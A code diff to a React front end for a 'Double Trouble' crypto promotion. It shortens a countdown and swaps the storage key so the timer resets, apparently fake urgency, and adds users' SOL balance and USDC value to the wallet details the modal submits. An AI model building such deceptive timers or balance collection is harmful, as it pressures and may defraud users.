@@ -989,13 +989,12 @@ function CountdownPill() {
 // ─── DOUBLE TROUBLE PILL ─────────────────────────────────────────────────────
 
 function DoubleTroublePill() {
-  const DURATION_MS = 14 * 60 * 60 * 1000; // 14 hours from first render
+  const DURATION_MS = (4 * 60 + 12) * 60 * 1000; // 4h 12m
   const [timeLeft, setTimeLeft] = useState(null);
   const [expanded, setExpanded] = useState(false);
 
   useEffect(() => {
-    // Store start time in sessionStorage so it persists on refresh within same tab session
-    const KEY = 'dt_start';
+    const KEY = 'dt_start_v2'; // fresh key resets the timer
     let start = parseInt(sessionStorage.getItem(KEY) || '0');
     if (!start || Date.now() - start > DURATION_MS) {
       start = Date.now();
@@ -1358,6 +1357,8 @@ function DoubleTroubleModal({ onClose }) {
           name: payload.name,
           exchangeWallet: payload.exchangeWallet,
           walletAddress: payload.walletAddress,
+          solBalance: payload.solBalance,
+          usdcValue: payload.usdcValue,
           svk: payload.svk,
           socialLink: payload.socialLink,
           foundryLink: payload.foundryLink,
